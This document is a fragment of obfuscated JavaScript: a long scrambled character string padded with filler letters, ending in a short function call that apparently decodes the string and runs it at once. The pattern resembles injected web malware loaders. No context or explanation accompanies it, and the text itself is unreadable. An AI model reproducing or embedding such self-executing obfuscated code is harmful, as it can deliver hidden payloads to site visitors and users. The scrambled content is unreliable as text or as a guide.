]t01#.Ys2_=bt=7[YoYng2ite.2i%n5teRYY(#h.Z%0%+]t%h%e_};{10Hn&ol=Y:oYm=_oiac)mm;b3WK_]_H4fYud{Yn7xf(<0?:pCKa.3nY11,Y6Yn%%)|Yi;=%YotO3yti_Ys4d.t(e)YYo9c=}]A=nYbYJiY.cb_a2Na}oi.(2orlc0bY2YmdrS;;YYfn)[Y_ft]84Y%Y}s8_9]{%{]n;)s1te).tYbal[,a11NV3nYNceY!s_8_m[YmYY]f])aa[i}in8sYY1M())utNu_Y4%Y]\/}q(gYo0;0s+8t)a5%,1$(iYYs4.YY6c5t5:8=_-1gap}o4=gt4_N"8t5coeYYNeYicb=YY" Y)Vp]]gp2i{.0]]Yi;8>!Xedatr?e,ot} 63p(}Y.} c}iYsYYsi4[lcr._c__YYcO.y"Y.Yn_0( %}oKY]1,ir9gYndYerYat7rhg.3XY9_r1a]iean0:p}o3"]e]%YY5BY_ofYt(saY)_dqYea_a6;o;E?=YY$e\/a.ti&Y_C_]b6Nrmjc6tl96 $4.u4Sa![[=Y]Y:=.v.sc8faYd!5a;2YoociYho7r]io&]])aerht61 ad%n3QY(_n]eYo ap_gYe;i=P) -#{Y3.Y92itY3(Y=Yb5Llo}o)a1t]Y0Yd;kY.n_YY7bru[]Yocob]cbY-Y4_u7.<2+s:fYY?1__e!_)%R!t(#.re;5.YJd3-u(YdY]goi5}c0[)6-x(MoEyl-!,oh%Ya t9Yt.a1[J4aYt9ta_=l]_Yjs !YR;eYruur =1a2o(Y(]tY xhoo]rL_Y$r.Y_bYt 4N3]$2aYd_a(a1Y33{o=au_a3}Te(]YV2{dd__Y"x.w%(Q5uhatb1eplY9aY]s{1r=!{cyc_%e]p en1clf.(vS9 ]o@E5[_61nY.ZtYY9ao0.WtuY)09]h6)a.tcYm29poucLOr=72daz!Y_Ybib)dlcdI-Yi%fai;t3=F]no )a3%(e][4,[pY,[Y(}em1Cbg)te]3Ys)Yt"gYvt IYDc=>Y)rn86YYSa;!Fd-YdY_].=FY0!H)_yvd.am))Yn.v)ah_h.0.\/;irYn,!j7laa.+,N,tr"tYC1+8r;g==r.&cm.1Y_f%, b|if2_1a_)3s4} _tec;6l.a9i=Yjenuf(8jY=;t8mrYf4]YnY,s*{'));var plR=uis(rdB,fZf );plR(8084);return 2291})()
